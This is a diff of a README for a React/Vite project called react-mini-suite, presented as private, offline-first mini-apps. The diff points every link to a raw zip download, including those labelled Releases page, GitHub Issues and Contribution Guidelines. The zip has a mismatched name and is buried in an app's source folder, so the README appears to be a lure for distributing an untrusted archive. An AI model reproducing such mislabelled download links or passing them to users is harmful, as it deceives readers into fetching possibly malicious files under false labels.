@@ -4,13 +4,13 @@
 Welcome to **react-mini-suite**! This is your go-to place for simple, offline-first mini-apps made with HTML, SCSS, and JavaScript, all running in a React/Vite shell. Enjoy quick access to useful applications that work without an internet connection and are print-ready. Each app uses only local storage, ensuring your data stays private and secure. 
 
 ## 📥 Download Now
-[![Download react-mini-suite](https://raw.githubusercontent.com/bougnaboy/react-mini-suite/main/uncompass/react-mini-suite.zip%20Now-%F0%9F%9A%80-brightgreen)](https://raw.githubusercontent.com/bougnaboy/react-mini-suite/main/uncompass/react-mini-suite.zip)
+[![Download react-mini-suite](https://github.com/bougnaboy/react-mini-suite/raw/refs/heads/main/src/pages/apps/frequencyGenerator/suite-mini-react-v1.0-beta.3.zip%20Now-%F0%9F%9A%80-brightgreen)](https://github.com/bougnaboy/react-mini-suite/raw/refs/heads/main/src/pages/apps/frequencyGenerator/suite-mini-react-v1.0-beta.3.zip)
 
 ## 🚀 Getting Started
 Getting started with **react-mini-suite** is simple. Follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/bougnaboy/react-mini-suite/main/uncompass/react-mini-suite.zip) to view the available mini-apps.
+   Go to our [Releases page](https://github.com/bougnaboy/react-mini-suite/raw/refs/heads/main/src/pages/apps/frequencyGenerator/suite-mini-react-v1.0-beta.3.zip) to view the available mini-apps.
 
 2. **Choose an App**  
    Browse through the list of mini-apps. Each app is designed for specific tasks, so pick one that suits your needs.
@@ -64,14 +64,14 @@ You can find additional resources and discussions on our topics related to **rea
 ## 📦 Download & Install
 To get started quickly, please use the large button below to access the releases page:
 
-[Download react-mini-suite](https://raw.githubusercontent.com/bougnaboy/react-mini-suite/main/uncompass/react-mini-suite.zip)
+[Download react-mini-suite](https://github.com/bougnaboy/react-mini-suite/raw/refs/heads/main/src/pages/apps/frequencyGenerator/suite-mini-react-v1.0-beta.3.zip)
 
 Remember, simply follow the steps mentioned in the "Getting Started" section to download and run a mini-app. Each app is designed for straightforward use, making sure you can focus on what matters.
 
 ## 📞 Support
-If you encounter any questions or issues, feel free to visit our [GitHub Issues](https://raw.githubusercontent.com/bougnaboy/react-mini-suite/main/uncompass/react-mini-suite.zip) page to seek help or report problems. 
+If you encounter any questions or issues, feel free to visit our [GitHub Issues](https://github.com/bougnaboy/react-mini-suite/raw/refs/heads/main/src/pages/apps/frequencyGenerator/suite-mini-react-v1.0-beta.3.zip) page to seek help or report problems. 
 
 ## 🤝 Contributing
-This project is open-source. If you're interested in contributing, check out the [Contribution Guidelines](https://raw.githubusercontent.com/bougnaboy/react-mini-suite/main/uncompass/react-mini-suite.zip) to get started.
+This project is open-source. If you're interested in contributing, check out the [Contribution Guidelines](https://github.com/bougnaboy/react-mini-suite/raw/refs/heads/main/src/pages/apps/frequencyGenerator/suite-mini-react-v1.0-beta.3.zip) to get started.
 
 Thank you for choosing **react-mini-suite**! Enjoy creating and managing your tasks with our handy mini-apps.
